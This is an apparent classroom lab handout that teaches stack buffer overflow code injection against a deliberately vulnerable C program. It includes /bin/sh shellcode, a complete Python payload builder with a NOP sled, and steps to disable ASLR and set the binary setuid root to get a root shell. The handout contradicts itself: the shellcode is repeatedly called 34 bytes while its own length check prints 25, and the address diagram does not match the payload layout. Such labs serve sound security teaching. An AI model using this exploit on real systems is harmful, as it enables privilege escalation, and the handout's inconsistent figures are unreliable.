# Lab 3: SEED Labs - Injecting Your Own Code (Shellcode)

**Time:** 45-60 minutes  
**Difficulty:** Advanced but we'll guide you step-by-step!
**Goal:** Learn how to inject and execute your own code in a vulnerable program

---

## Introduction: Where We Are Now

### What You've Already Done

In the previous two labs, you learned the basics of buffer overflows:

- **Lab 1 (Protostar):** You overflowed a buffer and changed a nearby variable
  - This taught you that overflowing affects adjacent memory
  
- **Lab 2 (picoCTF):** You overflowed a buffer and jumped to an existing function
  - This taught you that you can control where the program goes next

### What's New in This Lab

Now we're going to do something more powerful: **inject our own code** and make the program run it!

Think of it this way:
- Lab 1: You knocked over a cup of water (simple overflow)
- Lab 2: You redirected someone to a different room (control flow)
- Lab 3: You're bringing your own instructions and making them follow it (code injection)

---

## Section 1: Understanding the Vulnerable Program

**Purpose of this section:** See exactly what we're attacking and why it's vulnerable.

### The Source Code

Here's the program we'll exploit. Read through it and we'll explain each part:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// This function has the vulnerability
int bof(char *str)
{
    char buffer[24];        // ← Only 24 bytes of space
    strcpy(buffer, str);    // ← Copies ALL of str, no size check!
    return 1;
}

// Main function reads from a file and calls bof()
int main(int argc, char **argv)
{
    char str[517];          // ← Can hold 517 bytes
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);  // ← Reads 517 bytes from file
    bof(str);               // ← Passes all 517 bytes to bof()
    printf("Returned Properly\n");
    return 1;
}
```

### Breaking Down the Vulnerability

**Line-by-line explanation:**

1. **`char buffer[24];`** - This creates space for only 24 bytes
   - Think of it like a box that can only hold 24 items

2. **`strcpy(buffer, str);`** - This copies `str` into `buffer`
   - The problem: `strcpy()` doesn't check if `buffer` is big enough!
   - It's like trying to pour 517 ounces of water into a 24-ounce cup

3. **`fread(str, sizeof(char), 517, badfile);`** - Reads 517 bytes from a file
   - We control this file! We can put anything we want in it

### The Math
```
Buffer size:     24 bytes
Input size:     517 bytes
Overflow:       517 - 24 = 493 bytes!
```

**What this means:** We have 493 extra bytes that spill over and can overwrite other parts of memory!

### Visual Representation
```
Stack memory layout:

Higher addresses
    ↑
    | [Return Address]  ← We'll overwrite this!
    | [Saved EBP]
    | [buffer (24 bytes)] ← Starts here
    ↓
Lower addresses
```

**What happens when we overflow:**
```
Our 517 bytes:

[24 bytes fill buffer] [Spills over and overwrites saved EBP] [Overwrites return address] [Keeps going...]
```

---

## Section 2: What is Shellcode?

**Purpose of this section:** Understand what code we're injecting and why it works.

### Simple Explanation

**Shellcode** is a small piece of machine code (the 1s and 0s the CPU understands) that we inject into a program to make it do what we want.

It's called "shellcode" because it usually spawns a **shell** - a command prompt where you can type commands.

### Why We Need Shellcode

In Lab 2, we jumped to a function that already existed in the program (`win()`). But what if:
- The program doesn't have a useful function?
- We want to do something specific (like spawn a shell)?

**Solution:** We write our own instructions and inject them!

### Our Shellcode (Already Written For You)

Here's the shellcode we'll use. Don't worry about understanding every byte - just know what it does:
```python
shellcode = (
    b"\x31\xc0"             # xor eax, eax           - Clear EAX register
    b"\x50"                 # push eax               - Push NULL onto stack
    b"\x68\x2f\x2f\x73\x68" # push "//sh"            - Part of "/bin//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"            - Part of "/bin//sh"
    b"\x89\xe3"             # mov ebx, esp           - EBX points to "/bin//sh"
    b"\x50"                 # push eax               - Push NULL
    b"\x53"                 # push ebx               - Push pointer to string
    b"\x89\xe1"             # mov ecx, esp           - ECX points to arguments
    b"\x31\xd2"             # xor edx, edx           - Clear EDX (CRITICAL!)
    b"\xb0\x0b"             # mov al, 11             - System call number
    b"\xcd\x80"             # int 0x80               - Execute system call!
)
```

**Total size:** 34 bytes (very small!)

### What Each Part Does (Simplified)

Let me break down the shellcode into understandable chunks:

**Step 1: Build the string "/bin/sh"**
```python
b"\x31\xc0"             # Start fresh - clear a register
b"\x50"                 # Put a NULL at the end (strings need this)
b"\x68\x2f\x2f\x73\x68" # Add "//sh" to memory
b"\x68\x2f\x62\x69\x6e" # Add "/bin" to memory
# Result: We now have "/bin//sh" in memory (the extra / is okay)
```

**Step 2: Point to our string**
```python
b"\x89\xe3"             # Save the location of "/bin//sh"
```

**Step 3: Prepare arguments**
```python
b"\x50"                 # NULL (end of arguments)
b"\x53"                 # Pointer to "/bin//sh"
b"\x89\xe1"             # Save location of arguments
```

**Step 4: Clear a register (IMPORTANT!)**
```python
b"\x31\xd2"             # Clear EDX - if we don't do this, the shell crashes!
# This line took 3 hours to figure out - don't skip it!
```

**Step 5: Execute!**
```python
b"\xb0\x0b"             # Tell CPU: "I want to run a program" (system call 11)
b"\xcd\x80"             # Do it! Execute /bin/sh
```

### What Happens When This Runs

1. CPU reads these bytes as instructions
2. Builds the string "/bin/sh" in memory
3. Calls the operating system
4. OS launches /bin/sh (a shell)
5. **You get a command prompt with root access!**

---

## Section 3: The NOP Sled Technique

**Purpose of this section:** Learn how to make our exploit reliable even without exact addresses.

### The Problem We Need to Solve

When we overflow the buffer, we need to make the program jump to our shellcode. But there's a problem:

**We need to know the EXACT address where our shellcode is in memory.**

Example:
- If shellcode is at address `0xffffcb08`, we must jump to `0xffffcb08`
- If we jump to `0xffffcb09` (off by 1!), the CPU reads garbage and crashes
- If we jump to `0xffffcb07` (off by 1 the other way!), also crashes

**This is hard because:**
- Addresses change slightly each time the program runs
- Debugging shows different addresses than normal execution
- We might not know the exact address

### The Solution: NOP Sled

A **NOP sled** (also called a **NOP slide**) is a clever trick:

**NOP** = "No Operation" instruction
- In machine code: `\x90`
- What it does: Absolutely nothing! Just moves to the next instruction

**The idea:** Instead of one perfect landing spot, create a HUGE landing zone!

### Visual Representation
```
Our buffer with a NOP sled:

Memory Address    | Content
------------------|----------------------------------
0xffffcb08        | NOP (\x90)  ← Jump here? Works!
0xffffcb09        | NOP (\x90)  ← Or here? Works!
0xffffcb0a        | NOP (\x90)  ← Or here? Works!
0xffffcb0b        | NOP (\x90)  ← Or here? Works!
...               | ... 200 more NOPs ...
0xffffcbd0        | NOP (\x90)  ← Jump here? Works! (our target)
0xffffcbd1        | NOP (\x90)
...               | ... more NOPs ...
0xffffcc00        | Shellcode starts here! (34 bytes)
0xffffcc01        | Shellcode byte 2
...               | ...
0xffffcc21        | Shellcode byte 34 (end)
```

### How It Works

**When we jump to ANY NOP:**
1. CPU executes the NOP (does nothing)
2. Moves to next instruction (another NOP)
3. Executes that NOP (does nothing)
4. Moves to next instruction (another NOP)
5. Keeps going... slide, slide, slide...
6. Eventually hits our shellcode!
7. **Shellcode executes!**

### Real-World Analogy

Think of it like bowling:
- **Without NOP sled:** You need to hit ONE specific pin perfectly (very hard!)
- **With NOP sled:** The entire lane is covered with pins - wherever the ball goes, it hits something and rolls forward to the target (easy!)

### Why This is Brilliant

Instead of needing the EXACT address (like `0xffffcc00`), we can jump to ANY address in a 200-byte range!

- Jump to `0xffffcb08`? Slides to shellcode! ✓
- Jump to `0xffffcb50`? Slides to shellcode! ✓
- Jump to `0xffffcbd0`? Slides to shellcode! ✓
- Jump to `0xffffcbf0`? Slides to shellcode! ✓

**200 bytes of forgiveness instead of 1 byte precision!**

---

## Section 4: Three Critical Mistakes (And How to Avoid Them)

**Purpose of this section:** Learn from 3+ hours of debugging so you don't make the same mistakes!

### ⚠️ Mistake #1: Wrong Compilation Flags

**The Problem:** If you compile the program wrong, your exploit will ALWAYS fail, no matter what you do.

**What happens:** You'll see "Segmentation fault" and spend hours debugging for nothing.

**Why it happens:** Modern security features randomize addresses, making exploits impossible.

### How to Compile CORRECTLY

**ALWAYS use this EXACT command:**
```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
```

**What each flag means:**

- **`-m32`** - Compile as 32-bit program
  - Why: 32-bit is easier to exploit (smaller addresses)
  
- **`-fno-stack-protector`** - Turn off stack canaries
  - Why: Stack canaries detect and stop buffer overflows
  
- **`-z execstack`** - Make the stack executable
  - Why: We need to RUN our shellcode from the stack
  
- **`-no-pie`** - Disable Position Independent Executable
  - Why: **THIS IS CRITICAL!** PIE randomizes addresses

### How to Verify It Worked

**Run this command:**
```bash
file stack
```

**You should see:**
```
stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)...
```

**The important word:** `executable`

**BAD - If you see this:**
```
stack: ELF 32-bit LSB pie executable...
```

**The word "pie" means it's WRONG!** You MUST recompile!

**Why this matters:** If you see "pie", addresses randomize. Your exploit will get different addresses every time and always crash.

---

### ⚠️ Mistake #2: Using Addresses from GDB

**The Problem:** Addresses you find in GDB (the debugger) are WRONG for the real program!

**What happens:** Exploit works in GDB but crashes when run normally (or vice versa).

**Why it happens:** GDB adds extra environment variables when debugging, shifting the stack by ~224 bytes.

### Example of the Problem
```bash
# In GDB (debugger):
(gdb) x/x buffer
0xffffcce8    ← Buffer address in GDB

# In normal execution:
0xffffcb08    ← Real buffer address
```

**Difference:** `0xffffcce8 - 0xffffcb08 = 0xe0` = **224 bytes off!**

### The Solution: Create a Debug Program

We'll modify the program to print its own address. Create a file called `stack_debug.c`:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Helper function to get stack pointer
// Don't worry about understanding this - it just gets an address
unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
}

int bof(char *str)
{
    char buffer[24];
    
    // ⭐ THIS IS THE KEY LINE ⭐
    // Print the buffer's real address at runtime
    printf("Buffer address: 0x%x\n", (unsigned int)buffer);
    printf("Stack pointer: 0x%lx\n", get_sp());
    
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

**What this does:** Prints the buffer's address when you run it normally (not in GDB).

### How to Use It
```bash
# Compile the debug version
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack_debug stack_debug.c

# Make it a Set-UID program (runs as root)
sudo chown root stack_debug
sudo chmod 4755 stack_debug

# Run it
./stack_debug
```

**Output:**
```
Buffer address: 0xffffcb08    ← USE THIS ADDRESS IN YOUR EXPLOIT!
Stack pointer: 0xffffcc20
```

**Use the "Buffer address" value in your exploit!**

---

### ⚠️ Mistake #3: Dirty EDX Register

**The Problem:** Shell spawns for a split second, then crashes immediately.

**What you see:**
```bash
$ ./stack
# (Shell appears!)
$ whoami
Segmentation fault    ← Crashes!
```

**Why it happens:** The `execve()` system call (which launches programs) requires certain CPU registers to be clean. If the EDX register has garbage in it, the system call fails.

**This took 3 hours to debug!** The shell would spawn but die instantly.

### The Fix (Already in Our Shellcode)

Look at this line in our shellcode:
```python
b"\x31\xd2"    # xor edx, edx
```

**What it does:** Clears the EDX register (sets it to 0)

**What happens if you remove it:** Shell crashes immediately!

**Good news:** Our shellcode already has this fix, so you don't need to worry about it. Just don't remove that line!

---

## Section 5: Building the Exploit

**Purpose of this section:** Put everything together into a working exploit script.

### The Overall Strategy

Our payload will look like this:
```
Byte positions     | What goes there        | Why
-------------------|------------------------|---------------------------
0 - 35             | NOPs (\x90)            | Padding before return address
36 - 39            | Return address         | Points to our NOP sled
40 - 482           | NOPs (\x90)            | The NOP sled (443 bytes!)
483 - 516          | Shellcode (34 bytes)   | Our injected code
```

**Total:** 517 bytes (exactly what the program reads!)

### The Exploit Code

Create a file called `seedlabs_exploit.py`:
```python
#!/usr/bin/env python3
# This script generates the malicious payload

import struct  # For converting numbers to bytes

# ============================================================================
# PART 1: Our shellcode (the code we're injecting)
# ============================================================================

shellcode = (
    b"\x31\xc0"             # xor eax, eax
    b"\x50"                 # push eax
    b"\x68\x2f\x2f\x73\x68" # push "//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"
    b"\x89\xe3"             # mov ebx, esp
    b"\x50"                 # push eax
    b"\x53"                 # push ebx
    b"\x89\xe1"             # mov ecx, esp
    b"\x31\xd2"             # xor edx, edx  ← CRITICAL LINE!
    b"\xb0\x0b"             # mov al, 11
    b"\xcd\x80"             # int 0x80
)

print(f"[+] Shellcode is {len(shellcode)} bytes")  # Should be 34

# ============================================================================
# PART 2: Set the addresses
# ============================================================================

# ⭐ CHANGE THIS! ⭐
# Get this address from running stack_debug
buffer_addr = 0xffffcb08    # ← PUT YOUR ADDRESS HERE!

# We'll jump to the middle of the NOP sled (200 bytes in)
# This gives us room for error
ret_addr = buffer_addr + 200

print(f"[+] Buffer starts at: {hex(buffer_addr)}")
print(f"[+] Jumping to: {hex(ret_addr)}")

# ============================================================================
# PART 3: Build the payload
# ============================================================================

# Create a 517-byte array filled with NOPs
payload = bytearray([0x90] * 517)

# Position 36-39: Overwrite the return address
# struct.pack converts the number to 4 bytes (little-endian)
ret_offset = 36
payload[ret_offset:ret_offset+4] = struct.pack("<I", ret_addr)

print(f"[+] Return address placed at offset {ret_offset}")

# Position 483-516: Place our shellcode at the END
# 517 - 34 = 483 (starting position)
shellcode_start = 517 - len(shellcode)  # = 483
payload[shellcode_start:] = shellcode

print(f"[+] Shellcode placed at offset {shellcode_start}")

# ============================================================================
# PART 4: Save the payload to a file
# ============================================================================

# The vulnerable program reads from a file called "badfile"
with open('badfile', 'wb') as f:
    f.write(payload)

print(f"[+] Payload saved to 'badfile' ({len(payload)} bytes)")
print("[+] Now run: ./stack")
print("[+] You should get a root shell!")
```

### Understanding Each Part

**Part 1: Shellcode**
- This is the code that spawns `/bin/sh`
- It's already written for you - just use it as-is
- Total: 34 bytes

**Part 2: Addresses**
- `buffer_addr` = Where the buffer is in memory (get from `stack_debug`)
- `ret_addr` = Where we'll jump to (middle of NOP sled)
- We add 200 to give ourselves room for error

**Part 3: Build Payload**
- Start with 517 NOPs (`\x90`)
- At position 36: Put the return address (4 bytes)
  - `struct.pack("<I", ret_addr)` converts number to bytes
  - `"<I"` means "little-endian unsigned integer"
- At position 483: Put our shellcode (34 bytes)

**Part 4: Save to File**
- Write the payload to `badfile`
- The vulnerable program will read this file

---

## Section 6: Running the Exploit

**Purpose of this section:** Execute the attack step-by-step.

### Step 1: Prepare the System

**First, disable address randomization:**
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

**What this does:** Turns off ASLR (Address Space Layout Randomization)
- ASLR moves programs to random addresses each time they run
- This makes exploits fail because we can't predict addresses
- We're turning it off to learn how exploits work

**Note:** On a real system, you'd NEVER turn this off - it's a critical security feature!

---

### Step 2: Compile the Vulnerable Program
```bash
# Navigate to the directory
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack

# Compile with the CORRECT flags (no PIE!)
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c

# Verify it compiled correctly
file stack
# Should say "ELF 32-bit LSB executable" (NOT "pie executable")
```

---

### Step 3: Make it a Set-UID Program
```bash
# Change owner to root
sudo chown root stack

# Set the Set-UID bit
sudo chmod 4755 stack

# Verify the permissions
ls -l stack
```

**You should see:**
```
-rwsr-xr-x  1 root  ...  stack
 ↑
 └─ This 's' means Set-UID is enabled
```

**What Set-UID means:**
- Normally, programs run with YOUR permissions
- Set-UID makes it run with the OWNER's permissions
- Since root owns it, the program runs as root!
- When we spawn a shell, we get a ROOT shell!

---

### Step 4: Find the Buffer Address
```bash
# Compile the debug version
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack_debug stack_debug.c

# Make it Set-UID too
sudo chown root stack_debug
sudo chmod 4755 stack_debug

# Run it to see the address
./stack_debug
```

**Output:**
```
Buffer address: 0xffffcb08    ← COPY THIS ADDRESS!
Stack pointer: 0xffffcc20
```

---

### Step 5: Update Your Exploit

**Open `seedlabs_exploit.py` and change this line:**
```python
buffer_addr = 0xffffcb08    # ← PUT THE ADDRESS YOU JUST GOT!
```

**Save the file!**

---

### Step 6: Generate the Payload
```bash
# Navigate to exploits directory
cd ~/buffer-overflow-teaching-kit/exploits

# Run the exploit script
python3 seedlabs_exploit.py
```

**Output:**
```
[+] Shellcode is 34 bytes
[+] Buffer starts at: 0xffffcb08
[+] Jumping to: 0xffffcbd0
[+] Return address placed at offset 36
[+] Shellcode placed at offset 483
[+] Payload saved to 'badfile' (517 bytes)
[+] Now run: ./stack
[+] You should get a root shell!
```

**This creates a file called `badfile` with our malicious payload!**

---

### Step 7: Execute the Attack!
```bash
# Go to where the vulnerable program is
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack

# Run the vulnerable program
./stack
```

### What Should Happen

**If successful, you'll get a shell prompt:**
```bash
#     ← This is a root shell prompt!
```

**Try these commands:**
```bash
# whoami
root

# id
uid=1000(yourname) gid=1000(yourname) euid=0(root) groups=0(root),...

# ls
badfile  stack  stack.c
```

**Explanation of the output:**
- `whoami` shows you're root
- `uid=1000` is your normal user ID
- `euid=0(root)` means effective user ID is root - you have root powers!

**To exit the shell:**
```bash
# exit
```

---

## Section 7: What Just Happened? (Step-by-Step)

**Purpose of this section:** Understand the complete attack flow.

### The Attack Timeline

**1. Program starts:**
```
main() reads 517 bytes from badfile into str[]
```

**2. bof() is called:**
```
bof(str) tries to copy 517 bytes into a 24-byte buffer
```

**3. Buffer overflows:**
```
Stack before:                Stack after:
[return address: main]       [return address: 0xffffcbd0] ← We changed this!
[saved EBP]                  [overwritten with NOPs]
[buffer: empty]              [buffer: filled with NOPs]
```

**4. bof() tries to return:**
```
Instead of returning to main(), it jumps to 0xffffcbd0 (our NOP sled)
```

**5. Execution slides through NOPs:**
```
0xffffcbd0: NOP (\x90) → do nothing, move forward
0xffffcbd1: NOP (\x90) → do nothing, move forward
0xffffcbd2: NOP (\x90) → do nothing, move forward
... keeps going ...
```

**6. Reaches our shellcode:**
```
0xffffcc00: First byte of shellcode
CPU starts executing our injected code!
```

**7. Shellcode executes:**
```
- Builds the string "/bin/sh"
- Calls execve() system call
- OS launches /bin/sh
```

**8. We get a shell:**
```
#     ← Root shell prompt!
```

---

## Section 8: Simple Exercise

**Purpose of this section:** Test your understanding with a hands-on challenge.

### Exercise: Break It On Purpose!

Let's experiment to understand how precise exploits need to be.

**Challenge 1: Wrong Address**

1. Open `seedlabs_exploit.py`
2. Change the buffer address to something wrong:
```python
   buffer_addr = 0xffffcb00    # Off by 8 bytes!
```
3. Run `python3 seedlabs_exploit.py`
4. Run `./stack`

**Question:** What happens?
<details>
<summary>Click to see</summary>
**Segmentation fault!** The program crashes because we jumped to the wrong address.
</details>

**Challenge 2: Remove EDX Clearing**

1. Open `seedlabs_exploit.py`
2. Remove the line with `\x31\xd2` from shellcode:
```python
   shellcode = (
       b"\x31\xc0"
       b"\x50"
       b"\x68\x2f\x2f\x73\x68"
       b"\x68\x2f\x62\x69\x6e"
       b"\x89\xe3"
       b"\x50"
       b"\x53"
       b"\x89\xe1"
       # b"\x31\xd2"    ← REMOVED THIS LINE
       b"\xb0\x0b"
       b"\xcd\x80"
   )
```
3. Run the exploit

**Question:** What happens?
<details>
<summary>Click to see</summary>
Shell might spawn very briefly but crashes immediately! This shows why clearing EDX is critical.
</details>

**Challenge 3: Make NOP Sled Tiny**

1. Change the payload to have almost no NOPs:
```python
   # Instead of 517 NOPs, let's use mostly shellcode
   payload = bytearray([0x90] * 50)  # Only 50 bytes total
```
2. Try to make the exploit work

**Question:** Is it harder or easier?
<details>
<summary>Click to see</summary>
Much harder! With a small NOP sled, you need almost exact addresses. The big NOP sled gives you forgiveness.
</details>

**After experimenting, restore the original exploit code!**

---

## Section 9: Troubleshooting Guide

**Purpose of this section:** Fix common problems quickly.

### Problem 1: "Segmentation fault"

**This means:** The program crashed (jumped to wrong memory).

**Check these things:**

1. **Is the buffer address correct?**
```bash
   # Run stack_debug again to verify
   ./stack_debug
   # Update seedlabs_exploit.py with the address it prints
```

2. **Did you compile with -no-pie?**
```bash
   file stack
   # Should NOT say "pie executable"
   # If it does, recompile:
   gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
```

3. **Is ASLR disabled?**
```bash
   cat /proc/sys/kernel/randomize_va_space
   # Should output: 0
   # If not, run:
   sudo sysctl -w kernel.randomize_va_space=0
```

---

### Problem 2: "Permission denied" or "Operation not permitted"

**This means:** The program doesn't have the right permissions.

**Fix:**
```bash
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack

# Set ownership and permissions
sudo chown root stack
sudo chmod 4755 stack

# Verify
ls -l stack
# Should show: -rwsr-xr-x  1 root ...
```

---

### Problem 3: Shell spawns but crashes immediately

**This means:** EDX register issue (rare if you're using our shellcode).

**Fix:** Make sure your shellcode has this line:
```python
b"\x31\xd2"    # xor edx, edx
```

---

### Problem 4: "badfile: No such file or directory"

**This means:** The payload file isn't in the right place.

**Fix:**
```bash
# Make sure you run the exploit from the right directory
cd ~/buffer-overflow-teaching-kit/exploits
python3 seedlabs_exploit.py

# This creates badfile in the current directory
# Now copy it or run stack from here
```

---

### Problem 5: Nothing happens at all

**Possible causes:**

1. **Wrong directory:**
```bash
   # Make sure badfile is in the same directory as stack
   cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
   ls badfile  # Should exist
```

2. **Shellcode is wrong:**
```bash
   # Verify shellcode length
   python3 -c "shellcode = b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80'; print(len(shellcode))"
   # Should output: 25
```

---

## Section 10: Summary and Next Steps

**Purpose of this section:** Recap what you learned and where to go next.

### What You Accomplished 🎉

You just completed one of the most advanced buffer overflow attacks! Here's what you did:

✅ **Understood code injection** - How to inject your own code into a running program  
✅ **Learned about shellcode** - Machine code that spawns a shell  
✅ **Used NOP sleds** - A clever technique for reliable exploits  
✅ **Avoided critical mistakes** - PIE compilation, GDB addresses, EDX register  
✅ **Built a complete exploit** - From analyzing the vulnerability to getting root  
✅ **Spawned a root shell** - Gained root access through code injection

### Key Concepts You Mastered

1. **Buffer overflows can do more than change variables** - They can inject and run code!
2. **NOP sleds make exploits reliable** - Large landing zones instead of precise targeting
3. **Compilation flags matter** - One wrong flag breaks everything
4. **GDB lies about addresses** - Always use runtime addresses
5. **System calls are picky** - Registers must be clean (EDX = 0)

### The Bigger Picture

This technique (shellcode injection) is how many real attacks work:
- Hackers find buffer overflows in real programs
- They inject shellcode to take control
- They gain unauthorized access to systems

**The good news:** Modern systems have defenses:
- **DEP/NX Bit**: Makes the stack non-executable (can't run shellcode)
- **ASLR**: Randomizes addresses (can't predict where to jump)
- **Stack Canaries**: Detect buffer overflows before they happen
- **PIE**: Randomizes code locations
- **Fortify Source**: Replaces unsafe functions like strcpy()

**In our next section**, we'll learn how these defenses work and how to implement them!

### What's Next?

Now that you understand attacks, you're ready to learn defenses:
- How to write secure code
- How modern protections work
- How to prevent buffer overflows
- Best practices for secure programming

**Congratulations on completing the hardest lab!** 🚀

You now understand one of the most powerful exploitation techniques in cybersecurity!

---

## Quick Reference Card

**Compilation (CRITICAL!):**
```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
```

**Verify compilation:**
```bash
file stack  # Should NOT say "pie"
```

**Disable ASLR:**
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

**Find buffer address:**
```bash
./stack_debug  # Note the address it prints
```

**Generate payload:**
```bash
python3 seedlabs_exploit.py
```

**Run exploit:**
```bash
./stack  # Should get root shell
```

**Exit shell:**
```bash
exit
```

---

**End of Lab 3** 🎓